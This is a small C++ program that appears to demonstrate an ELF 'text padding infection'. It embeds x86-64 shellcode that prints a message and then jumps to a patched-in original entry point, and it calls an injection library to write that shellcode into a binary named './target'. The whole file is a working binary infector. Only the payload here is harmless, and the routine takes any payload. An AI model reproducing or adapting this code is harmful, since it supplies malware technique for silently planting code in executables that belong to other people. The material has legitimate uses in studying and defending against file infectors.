#include <stdexcept>
#include <zkinjections.hh>

u8 buffer[] = {
    0x52, 0x53, 0x57, 0xeb, 0x21, 0x48, 0x8b, 0x34, 0x24, 0xbf,
    0x01, 0x00, 0x00, 0x00, 0xba, 0x14, 0x00, 0x00, 0x00, 0xb8,
    0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x58, 0x5e, 0x5f, 0x5b,
    0x5a, 0xb8, 0x34, 0x12, 0x99, 0x00, 0xff, 0xe0, 0xe8, 0xda,
    0xff, 0xff, 0xff, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x20,
    0x69, 0x73, 0x20, 0x68, 0x65, 0x72, 0x65, 0x20, 0x62, 0x61,
    0x62, 0x79, 0x0a
};

#ifdef MAGIC_LEN
    #undef MAGIC_LEN
    #define MAGIC_LEN 3
#endif
int main(void)
{
    getchar();
    u8 magic[] = {0x34, 0x12, 0x99};
    try{
       Injections::TextPaddingInfection tpi("./target", magic);
       tpi.SetPayload(buffer, 63);
       tpi.InjectPayload();
    } catch (std::runtime_error& e) {
        std::cerr << e.what();
        std::exit(1);
    }
}
